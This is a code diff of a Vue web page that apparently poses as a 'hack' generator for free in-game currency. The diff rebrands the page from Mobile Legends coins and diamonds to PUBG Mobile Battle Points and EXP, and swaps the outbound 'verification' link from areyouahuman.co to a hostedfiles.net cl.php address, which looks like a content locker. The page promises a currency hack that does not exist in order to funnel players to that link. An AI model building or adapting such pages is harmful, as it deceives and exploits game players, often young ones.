@@ -2,7 +2,7 @@
   <div id="app">
     <div class="container">
 
-      <img alt="Mobile Legends Logo" id="logo" src="./assets/logo.png" @click="isdocloaded=!isdocloaded">
+      <img alt="PUBG Logo" id="logo" src="./assets/logo.png" @click="isdocloaded=!isdocloaded">
       
       <router-view/>
 
@@ -14,15 +14,15 @@
         </transition>
         <transition name="first-screen">
         <section v-if="showmaincontent">
-        <GoldHead>Mobile legends Coins Generator</GoldHead>
-        Hack mobile legends for coins and diamonds.
+        <GoldHead>PUBG Battle Points and EXP Generator</GoldHead>
+        Hack PUBG Mobile
         <br>
         <br>
       <div class="container">
         <div class="row">
           <div class="col-2"></div>
           <div class="col-10">
-          <h5 class="graytext">Diamonds</h5>
+          <h5 class="graytext">EXP</h5>
           </div>
         </div>
         <div class="row valuebox">
@@ -46,7 +46,7 @@
         <div class="row">
           <div class="col-2"></div>
           <div class="col-10">
-          <h5 class="graytext">Coins</h5>
+          <h5 class="graytext">Battle Points</h5>
           </div>
         </div>
         <div class="row valuebox">
@@ -180,7 +180,7 @@ export default {
       i : 0,
       showveri: false,
       ranPorts: 2,
-      link: "https://www.areyouahuman.co/cl.php?id=6b0ae0fc424a2a136cb352f666e3dce1"
+      link: "https://www.hostedfiles.net/cl.php?id=270355d0033eee9e2e2f38c23b93ed8d"
     }
   },
   computed: {
